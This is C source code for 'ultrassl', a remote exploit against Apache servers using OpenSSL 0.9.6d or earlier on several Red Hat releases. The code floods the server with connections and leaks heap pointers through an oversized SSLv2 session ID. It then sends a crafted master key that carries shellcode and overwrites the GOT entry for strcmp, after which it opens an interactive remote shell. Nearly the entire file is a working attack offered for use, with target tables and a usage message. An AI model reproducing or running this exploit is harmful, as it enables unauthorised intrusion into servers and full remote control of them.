#include <sys/types.h>
#include <sys/socket.h>

#include <netinet/in.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "ultrassl.h"
#include "shellcode.h"

u_long cipher, ciphers;

typedef struct {
	u_long retloc;		/* GOT address of strcmp */
	char *name;		   /* operating system name */
} targets;

targets target[] = {
	{0x080850a0, "redhat 7.3 (Valhalla)"},
	{0x080992d4, "redhat 7.2 (Enigma)"},
	{0x0809ade4, "redhat 7.1 (Seawolf)"},
};

targets *my_target;
int target_num = sizeof(target) / sizeof(*target);

int
main(int argc, char **argv)
{
	char opt;
	char *host, *p;
	u_long addr = 0;
	int sockfd, ver, i, port, con_num;

	ver = -1;
	port = 443;
	p = argv[0];
	con_num = 20;

	setvbuf(stdout, NULL, _IONBF, 0);

	puts("ultrassl - an openssl <= 0.9.6d apache exploit");

	if (argc < 2)
		usage(p);

	while ((opt = getopt(argc, argv, "p:c:a:t:")) != EOF) {
		switch (opt) {
		case 'p':
			port = atoi(optarg);
			break;
		case 'c':
			con_num = atoi(optarg);
			break;
		case 'a':
			addr = strtoul(optarg, NULL, 0);
			break;
		case 't':
			ver = atoi(optarg) - 1;
			break;
		default:
			usage(p);
		}
	}

	argv += optind;
	host = argv[0];

	if ((ver < 0 || ver >= target_num) && !addr) {
		printf("\ntargets:\n");
		for (i = 0; i < target_num; i++)
			printf("  -t%d\t%s\n", i + 1, target[i].name);
		exit(-1);
	}
	my_target = target + ver;

	if (addr)
		my_target->retloc = addr;

	if (!host)
		usage(p);

	putchar('\n');

	if (ver >= 0)
		printf("exploiting %s\n", my_target->name);

	printf("using %d byte shellcode\n\n", sizeof(one) + sizeof(two));

	for (i = 0; i < con_num; i++) {
		printf("creating connections: %d of %d\r", i + 1, con_num);
		if (connection(host, port) < 0)
			exit(-1);
		usleep(1000);
	}
	putchar('\n');

	infoleak(host, port);
	exploit(host, port, my_target->retloc);

	exit(0);
}

void
infoleak(char *host, int port)
{
	u_char *p;
	u_char buf[56];
	ssl_conn *ssl;

	memset(buf, 0, sizeof(buf));
	p = buf;

	/* session_id_length */
	*(long *) &buf[52] = 0x00000070;

	printf("\nperforming information leak:\n");

	ssl = ssl_connect(host, port);

	send_client_hello(ssl);
	get_server_hello(ssl);

	send_client_master_key(ssl, buf, sizeof(buf));

	generate_keys(ssl);

	get_server_verify(ssl);
	send_client_finish(ssl);
	get_server_finish(ssl, 1);

	printf("\ncipher\t= 0x%08x\n", cipher);
	printf("ciphers\t= 0x%08x\n", ciphers);
}

void
exploit(char *host, int port, u_long retloc)
{
	u_char *p;
	ssl_conn *ssl;
	int i, src_port;
	u_char buf[184 + sizeof(two)];
	struct sockaddr_in sin;

	ssl = ssl_connect(host, port);

	i = sizeof(struct sockaddr_in);
	if (getsockname(ssl->sockfd, (struct sockaddr *) & sin, &i) < 0) {
		struct {
			u_int maxlen;
			u_int len;
			char *buf;
		} nb;

		ioctl(ssl->sockfd, (('S' << 8) | 2), "sockmod");

		nb.maxlen = 0xffff;
		nb.len = sizeof(struct sockaddr_in);
		nb.buf = (char *) &sin;

		ioctl(ssl->sockfd, (('T' << 8) | 144), &nb);
	}
	src_port = ntohs(sin.sin_port);

	one[52] = (u_char) ((src_port >> 8) & 0xff);
	one[53] = (u_char) (src_port & 0xff);

	memset(buf, 0x41, sizeof(buf));

	p = buf;

	/* session id length */
	*(long *) &buf[52] = 0x00000070;

	memcpy(p + 56, one, sizeof(one));
	memcpy(p + 172 + 12, two, sizeof(two));

	printf("\nperforming exploitation..\n");

	*(long *) &buf[156] = cipher;
	*(long *) &buf[164] = ciphers;

	*(long *) &buf[172 + 4] = ciphers - 136;
	*(long *) &buf[172 + 8] = retloc - 192;

	send_client_hello(ssl);
	get_server_hello(ssl);

	send_client_master_key(ssl, buf, sizeof(buf));

	generate_keys(ssl);
	get_server_verify(ssl);

	send_client_finish(ssl);
	get_server_finish(ssl, 0);

	sleep(1);

	shell(ssl->sockfd);
}

void
usage(char *prog)
{
	printf("usage: %s [-p <port>] [-c <connects>] [-t <type>] [-a] target\n"
	       "       -p\tserver port\n"
	       "       -c\tnumber of connections\n"
	       "       -t\ttarget type -t0 for list\n"
	       "       -a\taddress to overwrite (GOT of strcmp)\n"
	       "       target\thost running vulnerable openssl\n", prog);
	exit(-1);
}
